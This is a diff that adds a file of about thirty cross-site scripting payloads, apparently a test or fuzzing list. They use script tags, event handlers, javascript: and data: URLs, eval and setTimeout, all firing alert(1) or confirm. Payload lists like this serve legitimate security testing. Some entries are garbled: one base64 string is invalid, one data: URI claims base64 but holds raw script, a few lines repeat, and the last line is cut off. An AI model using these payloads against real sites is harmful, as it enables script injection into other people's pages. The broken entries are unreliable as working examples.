@@ -1,0 +1,31 @@
+<script>alert(1)</script>
+<img src="x" onerror="alert(1)">
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<input autofocus onfocus="alert(1)">
+<script src="javascript:alert(1)"></script>
+<script>alert('XSS')</script>
+<div onmouseover="alert(1)">hover me</div>
+<a href="javascript:alert(1)">click me</a>
+<body onload="alert(1)">
+<form action="javascript:alert(1)"></form>
+<script>confirm('XSS')</script>
+<button onclick="alert(1)">click me</button>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<input value="<script>alert(1)</script>" />
+<img src="x" onerror="alert('XSS')">
+<svg><script>alert(1)</script></svg>
+<audio src="javascript:alert(1)"></audio>
+<video src="javascript:alert(1)"></video>
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)"></embed>
+<link rel="stylesheet" href="javascript:alert(1)">
+<style>@import 'javascript:alert(1)';</style>
+<script src="data:text/javascript;base64,YWxert3nZDdiQm5nbjw!="></script>
+<script>alert("XSS")</script>
+<script>eval('alert(1)')</script>
+<script>setTimeout("alert(1)", 1000);</script>
+<img src="x" onerror="eval('alert(1)')">
+<object data="data:text/html;base64,<script>alert(1)</script>"></object>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<script>window.onload = function(){ alert(1);
